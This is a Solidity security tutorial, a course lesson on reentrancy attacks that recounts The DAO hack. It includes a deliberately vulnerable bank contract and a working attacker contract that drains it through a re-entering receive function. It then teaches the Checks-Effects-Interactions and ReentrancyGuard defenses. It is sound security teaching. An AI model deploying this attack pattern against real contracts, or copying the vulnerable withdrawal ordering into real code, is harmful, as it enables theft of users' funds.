---
title: "Day 18: Reentrancy Attack & Defensive Programming"
description: "Dissecting the most classic security vulnerability in blockchain history. Learn how The DAO was attacked, program a simulated reentrancy attack, and master the CEI defense pattern."
---

# Day 18: Reentrancy Attack & Defensive Programming

Welcome to Day 18! We are officially entering the final and most dramatic section of the course: **Mastering Web3 Security & Smart Contract Audit**.

In the Blockchain world, security is the thin line between brilliant success and total collapse. Today, we will study **Reentrancy Attack** - the most classic, famous, and dangerous security vulnerability in Blockchain history. 

In 2016, a Reentrancy attack targeting **The DAO** project drained **3.6 million ETH** (equivalent to over 15% of the total Ethereum supply at the time), forcing the Ethereum network to perform a historic split (Hard Fork) into two independent networks, Ethereum (ETH) and Ethereum Classic (ETC), as they exist today.

Let's analyze the technical nature of this attack and learn how to build an absolute defense line to protect your project's assets.

---

## 1. The Technical Nature of Reentrancy

A Reentrancy vulnerability occurs when a Smart Contract sends funds (ETH or Tokens) to an external address **BEFORE** it updates its own internal balance records.

### The "Infinite Withdrawal Loop" Scenario:
Imagine you walk into a traditional bank to withdraw your entire balance of $1,000:
1.  You request a withdrawal.
2.  The teller hands you the $1,000.
3.  **Before** the teller can type on the keyboard to update your balance to $0, you immediately shout: *"I want to withdraw another $1,000!"*.
4.  The teller looks at the screen, sees your balance is still $1,000, and hands you the money again.
5.  This cycle repeats until the bank's vault is completely empty!

In Solidity, when a contract sends ETH to a Hacker's Smart Contract address using the `.call{value: amount}("")` statement, the EVM **pauses** the execution of the bank contract and **hands over control** to the receiving function (`receive()` or `fallback()`) of the Hacker's contract. 

Taking advantage of this control, the Hacker's contract immediately **calls back** (re-enters) the bank's withdrawal function to perform the next withdrawal while its balance has not yet been deducted!

---

## 2. Simulating a Reentrancy Attack with Real Code

Let's program a vulnerable bank contract `VulnerableBank` and a malicious hacker contract `Attack` to clearly see how the attack takes place.

### 2.1. The Vulnerable Bank Contract (`VulnerableBank.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableBank {
    mapping(address => uint256) public balanceOf;

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
    }

    // HÀM RÚT TIỀN BỊ LỖI BẢO MẬT NGHIÊM TRỌNG!
    function withdraw() public {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "So du bang 0!");

        // 1. Thực hiện chuyển ETH đi trước (Nhường quyền điều khiển cho người nhận)
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Chuyen tien that bai!");

        // 2. Cập nhật lại số dư sau (Lệnh này sẽ KHÔNG bao giờ được chạy đến 
        // cho đến khi hacker hoàn tất việc rút sạch tiền)
        balanceOf[msg.sender] = 0;
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

---

### 2.2. The Malicious Hacker Attack Contract (`Attack.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBank.sol";

contract Attack {
    VulnerableBank public bank;
    address public owner;

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
        owner = msg.sender;
    }

    // Hàm nhận tiền tự động kích hoạt khi VulnerableBank chuyển ETH về
    receive() external payable {
        // Nếu số dư của ngân hàng vẫn lớn hơn hoặc bằng 1 ETH
        if (address(bank).balance >= 1 ether) {
            // TÁI NHẬP: Gọi lại hàm withdraw để cướp tiếp tiền!
            bank.withdraw();
        }
    }

    // Kích hoạt cuộc tấn công
    function attack() public payable {
        require(msg.value == 1 ether, "Yeu cau gui dung 1 ETH de tan cong!");
        
        // 1. Nạp 1 ETH vào ngân hàng để tạo uy tín
        bank.deposit{value: 1 ether}();
        
        // 2. Kích hoạt lượt rút tiền đầu tiên
        bank.withdraw();
    }

    // Rút toàn bộ số tiền cướp được về ví của Hacker
    function withdrawStolenFunds() public {
        require(msg.sender == owner, "Khong phai hacker owner!");
        payable(owner).transfer(address(this).balance);
    }
}
```

---

## 3. Absolute Defense Solutions

To protect your contract against a Reentrancy attack, we have two ultimate weapons:

### 3.1. The Checks-Effects-Interactions (CEI) Design Pattern
This is a mandatory design standard for every function in Solidity. Always organize the execution order of your code statements according to this rule:
1.  **Checks:** Perform all `require` or `if-revert` checks to validate input conditions.
2.  **Effects:** Update all state variables and balance records within the contract **first**.
3.  **Interactions:** Finally, perform external calls to other contracts or transfer funds.

#### Applying CEI to Fix the Withdrawal Function:
```solidity
function withdrawSafe() public {
    // 1. Checks
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "So du bang 0!");

    // 2. Effects (Cập nhật sổ sách trước!)
    balanceOf[msg.sender] = 0;

    // 3. Interactions (Chuyển tiền sau cùng)
    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Chuyen tien that bai!");
}
```
*Because the Hacker's balance is deducted to 0 in step 2, when the Hacker's contract tries to call the `withdrawSafe` function a second time (re-enter), it will be blocked immediately in step 1 because `balanceOf` is now 0!*

### 3.2. Using OpenZeppelin's `ReentrancyGuard`
If the contract logic is too complex and makes the CEI rule difficult to apply, you can inherit OpenZeppelin's **`ReentrancyGuard`** library and add the **`nonReentrant`** modifier to sensitive functions.

This modifier acts like a simple door lock: when the function starts, it locks the door (`lock = true`). If there is any call attempting to re-enter that function while the lock is closed, the transaction will automatically revert immediately. After the function has finished running completely, the lock is opened.

```solidity
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SecureBank is ReentrancyGuard {
    mapping(address => uint256) public balanceOf;

    // Thêm modifier nonReentrant để chống tái nhập tuyệt đối
    function withdraw(uint256 _amount) public nonReentrant {
        require(balanceOf[msg.sender] >= _amount, "Khong du so du!");
        
        balanceOf[msg.sender] -= _amount;
        payable(msg.sender).transfer(_amount);
    }
}
```

---

## Day 18 Summary

Today you have successfully dissected the biggest "nightmare" of the DeFi world:
1.  Understand the essence of a **Reentrancy Attack** and the flow of control transfer in the EVM.
2.  Program and simulate a real-world attack between the `VulnerableBank` and `Attack` contracts.
3.  Master the **Checks-Effects-Interactions (CEI) rule** - the ultimate philosophy of defensive programming.
4.  Know how to integrate OpenZeppelin's **`ReentrancyGuard`** to build an absolute protective shield.

**Practical Exercise:**
Open your Remix IDE and conduct a simulated attack:
1. Deploy the `VulnerableBank` contract.
2. Use 3 different legitimate wallet accounts to deposit a total of `10 ETH` into this bank.
3. Deploy the `Attack` contract and pass the address of `VulnerableBank` as a constructor parameter.
4. Use the Hacker's account to call the `attack` function, sending exactly `1 ETH` along with it.
5. Check the balances of the `Attack` and `VulnerableBank` contracts. You will witness something astonishing: the bank contract is completely drained of all `11 ETH`, which goes directly into the Hacker's wallet!
6. Modify the bank code according to the **CEI** rule or add `nonReentrant`, then run it again to confirm that the Hacker no longer has the opportunity to steal funds.

Tomorrow, we will explore two other highly sophisticated security vulnerabilities related to mathematical logic and authorization: **Overflow/Underflow** and **Weak Access Control**. See you then!
